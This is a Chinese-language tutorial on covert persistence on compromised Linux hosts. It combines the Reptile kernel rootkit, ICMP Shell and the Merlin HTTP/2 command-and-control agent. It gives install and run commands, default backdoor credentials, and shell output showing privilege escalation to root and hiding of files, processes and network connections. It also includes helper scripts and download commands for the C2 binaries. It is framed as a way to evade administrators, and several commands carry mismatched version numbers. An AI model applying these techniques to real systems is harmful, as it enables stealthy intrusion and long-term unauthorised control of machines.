设计思路


现在常用的 linux 维持权限的方法大多用 crontab 和开机自启动，同时使用的大多是msf 或者其它的 tcp 连接来反弹 shell ,这种做法比较容易被管理员发现。所以我们想有一个非 tcp 连接、流量不容易被怀疑的后门，并且在大量的 shell 的场景下，可以管理 shell ，因此采用 reptile+ishell+merlin 的组合。


Reptile

Reptile 是种 LKM rootkit，因此具有很好的隐藏性和强大的功能。

LKM的全称为 Loadable Kernel Modules，中文名为可加载内核模块，主要作用是用来扩展 linux 的内核功能。LKM的优点在于可以动态地加载到内存中，无须重新编译内核。由于 LKM 具有这样的特点，所以它经常被用于一些设备的驱动程序，例如声卡，网卡等等。当然因为其优点，也经常被骇客用于 rootkit 技术当中。

Reptile 具有的功能

  • Give root to unprivileged users

  • Hide files and directories

  • Hide processes

  • Hide himself

  • Hide TCP/UDP connections

  • Hidden boot persistence

  • File content tampering

  • Some obfuscation techniques

  • ICMP/UDP/TCP port-knocking backdoor

  • Full TTY/PTY shell with file transfer

  • Client to handle Reptile Shell

  • Shell connect back each X times (not default)

Reptile 用的是传统的反弹 shell ，就算加了一些混淆，流量也十分明显，所以我们不打算用 Reptile 的反弹功能，而采用了前五个功能。同时 reptile 还有很强的兼容性，作者在下面的系统上都测试过了

 安装 

reptile的安装比较简单，只需要安装一些依赖就可以直接安装

apt-get install vim gcc make g++ unzip -y
apt-get -y install linux-headers-$(uname -r)

安装reptile

cd Reptile-master
chmod +x ./setup.sh
./setup.sh install


安装reptile会出现几个选项

Hide name (will be used to hide dirs/files) (default: reptile): 会被隐藏的文件或文件名

Auth token to magic packets (default: hax0r):连接后门时的认证

tokenBackdoor password (default: s3cr3t):后门密码

Tag name that hide file contents (default: reptile):标签名，在该标签中的内容都会被隐藏，感觉很鸡肋，没啥用，因为运行脚本时也不会被识别， 在下面有标签样例

Source port of magic packets (default: 666): 源端口默认即可

Would you like to config reverse shell each X time? (y/n) (default: n): 是否每隔一段时间弹 shell ，这个功能很强，隐藏+开机自启动，如果对方防范意识不高，可以使用这个。而且 reptile 的反弹 shell 管理和 msf 类似

Token: hax0rBackdoor password: s3cr3tSRC port: 666

TAGs to hide file contents:

#<reptile>

content to be hidden#

</reptile>

 用法 

普通用户提权

$ su coco$ whoamicoco$ /reptile/reptile_cmd rootYou got super powers!$ whoamiroot

隐藏文件和目录

# 文件名中带reptile的都会被隐藏$ mkdir reptile_dir$ mkdir reptile_file$ ls -ltotal 0$ find / -name reptile_dir
$ find / -name reptile_file
# 由于reptile的安装目录和命令都带有reptile字符，所以reptile本身就是隐藏的

隐藏进程

$ nohup ping 114.114.114.114 &[1] 2571nohup: ignoring input and appending output to ‘nohup.out’$ ps -ef | grep ping | grep -v greproot       2571   2015  0 06:41 pts/1    00:00:00 ping 114.114.114.114$ /reptile/reptile_cmd hide 2571Success!$ ps -ef | grep ping | grep -v grep$

隐藏 TCP/UDP 连接

# 所有跟设定的IP的TCP/UDP连接都会被隐藏$ netstat  | grep 192.168tcp        0      0 localhost.localdoma:ssh 192.168.159.1:35076     ESTABLISHEDtcp        0      0 localhost.localdoma:ssh 192.168.159.1:38659     ESTABLISHEDtcp        0      0 localhost.localdoma:ssh 192.168.159.1:38653     ESTABLISHED$ /reptile/reptile_cmd tcp 192.168.159.1 4444 hideSuccess!$ netstat  | grep 192.168$

其它用法可参考wiki(https://github.com/f0rb1dd3n/Reptile/wiki)

我们可以把这些包装成函数写成脚本，可以提高使用效率

# this can hide hide the pidfunction hide_process {  pid=$1  if [ -z "$pid" ]; then    read -p "please input the pid you want to hide:" pid    if [ -z "$pid" ]; then      echo "Invalid pid"      usage      exit 0    fi  fi  /reptile/reptile_cmd hide $pid}
# can hide the connect by the ipfunction hide_connect {  $type=$2  $ip=$3  if [ -z "$ip" ]; then    read -p "please input the ip you want to hide:" pid    if [ -z "$ip" ]; then      echo "Invalid ip"      usage      exit 0    fi  fi  /reptile/reptile_cmd $type $ip 4444 hide }

通过这些功能配合其它工具的使用，可以达到来无影，去无踪的效果。


ICMP SHELL


ICMP Shell（ISH）是类似于 telnet 的协议。它允许用户连接到远程主机并仅使用 ICMP打开和发送数据就可以打开 shell 。ICMP Shell是用C语言编写的，用于UNIX环境。

ICMP 虽然不是新技术，但是 ICMP 具有很好的隐蔽性，结合 reptile 可以隐藏 pid，达到我们想要隐藏后门的效果。

 安装  
cd ISHELL-v0.2 && make linux


 使用  

服务端(靶机)

先来看看 ishd 的用法

# ./ishd -hICMP Shell v0.2  (server)   -   by: Peter Kieltykausage: ./ishd [options]
options: -h               Display this screen -d               Run server in debug mode （debug模式） -i <id>          Set session id; range: 0-65535 (default: 1515) （会话id，作为连接时的识别id） -t <type>        Set ICMP type (default: 0)  （icmp的类型，默认选0） -p <packetsize>  Set packet size (default: 512) （包大小，512，1024等都可以）
example:./ishd -i 65535 -t 0 -p 1024


客户端（攻击机）

ish 用法和 ishd 一样，只不过需要加个目标 ip

./ish -i 12345 -t 0 -p 1024 $ip


Merlin


Merlin是使用 Golang 编写的跨平台的 HTTP / 2控制服务器和代理。

与 ish 相反，HTTP/2 是新技术且还没广泛使用，并且 Merlin 在靶机上安装的客户端，并不是一直发起连接，而是间隔的，所以也可以达到一定的隐蔽性，同时 Merlin还提供了管理 shell 的功能。

 安装 
apt-get -y install p7zip-full# 客户端wget https://github.com/Ne0nd0g/merlin/releases/download/v0.8.0/merlinAgent-Linux-x64-v0.8.0.BETA.7z7z x merlinAgent-Linux-x64-v0.1.4.7z -pmerlin
# 服务端wget https://github.com/Ne0nd0g/merlin/releases/download/v0.8.0/merlinServer-Linux-x64-v0.8.0.BETA.7z7z x merlinServer-Linux-x64-v0.1.4.7z -pmerlin
 使用  
# 服务端 可以加上-debug查看详细信息./merlinServer-Linux-x64 -p 443
# 客户端./merlinAgent-Linux-x64 -url https://127.0.0.1:443

总结

在维持权限的路上任重而道远，围绕隐蔽性做文章，因此有个好的rootkit是十分重要的。而在后门中，围绕的重点要么是不为人注意的协议，要么是较新且没有广泛使用的协议。而当这两者组合起来，就能做到很好的维权。首先，reptile 隐藏了 Merlin 和 ish 的 pid 及 tcp 连接，普通管理员无法在系统里察觉到异常，而如果在交换机或者路由器查看，也是正常的 https 流量以及正常的 https 端口。除此之外，就算封了 Merlin 的 ip 和端口，还有 tsh作为备用，不至于一次就失去了权限。

当然，对于 linux 维持权限的方法不止这些，还需要探索更多的 linux 维持权限的方法，这样才能更好的维持住权限。现在的工具集也还有一些不足，比如更好的隐藏开机自启动，需要进行深入的探索。
